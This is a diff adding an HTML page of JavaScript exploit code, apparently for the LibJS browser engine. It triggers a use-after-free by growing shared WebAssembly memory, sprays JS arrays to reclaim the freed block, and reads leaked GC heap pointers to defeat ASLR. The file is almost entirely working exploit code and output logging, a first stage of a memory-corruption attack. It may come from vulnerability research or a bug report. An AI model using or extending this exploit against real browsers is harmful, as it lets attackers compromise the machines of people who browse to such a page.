@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head><title>BUG-1: pointer leak via UAF</title></head>
+<body>
+<pre id="log">Loading...</pre>
+<script>
+const out = document.getElementById('log');
+function log(s) { out.textContent += '\n' + s; }
+function hex(n) { return '0x' + n.toString(16); }
+
+// LibJS NaN-boxing (LibGC/NanBoxedValue.h, LibJS/Runtime/Value.h):
+//   TAG_SHIFT   = 48
+//   IS_CELL_BIT = 0xFFF8
+//   OBJECT_TAG  = 0xFFF9, STRING_TAG = 0xFFFA, etc.
+// Encoded object Value = (0xFFF9 << 48) | gc_cell_ptr
+const TAG_NAMES = {
+  0xFFF8n: "CELL",  0xFFF9n: "OBJECT", 0xFFFAn: "STRING",
+  0xFFFBn: "SYMBOL",0xFFFCn: "ACCESSOR",0xFFFDn: "BIGINT",
+};
+
+try {
+  const mem = new WebAssembly.Memory({initial: 1, maximum: 1000, shared: true});
+  const bufA = mem.buffer;
+  const viewA = new Uint32Array(bufA);   // cached_data_ptr set; len=16384
+  log("Created viewA on shared wasm memory bufA (64 KiB)");
+
+  mem.grow(1);    // refresh bufA's views; m_buffer -> bufB
+  mem.grow(100);  // refresh bufB only; ByteBuffer reallocates; viewA dangling
+  log("Grew memory 1->2->102 pages; viewA.cached_data_ptr now dangling over freed 128 KiB block");
+
+  // Reclaim the freed block with packed JS array element storage.
+  // Object::allocate_indexed_elements(cap) does kmalloc(8 + cap*8).
+  // The freed block came from kmalloc(kmalloc_good_size(131072)); try a spread
+  // of capacities so one of them lands in the same allocator size class.
+  let marker = {};
+  let target = {leakme: 1};
+  let spray = [];
+  for (let cap of [16383, 16384, 16380, 16376, 16352, 16319, 16255]) {
+    for (let r = 0; r < 8; r++) {
+      let a = [];
+      a.length = cap;          // pre-size to force single allocation at fill time
+      // fill with [marker, target, marker, target, ...] so we can identify slots
+      for (let i = 0; i < cap; i++) a[i] = (i & 1) ? target : marker;
+      spray.push(a);
+    }
+  }
+  log("Sprayed " + spray.length + " packed arrays of objects");
+
+  // Read freed block via dangling cached_data_ptr.
+  // Layout if reclaimed by allocate_indexed_elements:
+  //   [u32 cap][u32 pad][Value 0][Value 1]...
+  // -> viewA[0]=cap, viewA[1]=pad, then pairs (lo,hi) of NaN-boxed Values.
+  function read64(i) {
+    return BigInt(viewA[i]) | (BigInt(viewA[i+1]) << 32n);
+  }
+
+  log("");
+  log("viewA[0] (capacity?) = " + hex(viewA[0]));
+  log("Raw qwords at start of freed block:");
+  let leaked = [];
+  for (let i = 0; i < 16; i++) {
+    let q = read64(i*2);
+    let tag = q >> 48n;
+    let ptr = q & 0xFFFFFFFFFFFFn;
+    let name = TAG_NAMES[tag];
+    let line = "  [" + i + "] " + hex(q);
+    if (name) {
+      line += "  -> " + name + " @ " + hex(ptr);
+      leaked.push({tag: name, ptr});
+    }
+    log(line);
+  }
+
+  if (leaked.length >= 2) {
+    log("");
+    log(">>> ASLR DEFEAT: leaked " + leaked.length + " GC heap pointers <<<");
+    log(">>> marker @ " + hex(leaked[0].ptr) + "   target @ " + hex(leaked[1].ptr) + " <<<");
+    log(">>> GC heap base region ~ " + hex(leaked[0].ptr & 0xFFFFFFFFF000n) + " <<<");
+  } else {
+    log("");
+    log("No tagged pointers found in first 16 qwords.");
+    log("(Spray may not have reclaimed this exact slot; adjust capacities.)");
+  }
+
+} catch (e) {
+  log("Exception: " + e + "\n" + (e.stack || ""));
+}
+</script>
+</body>
+</html>
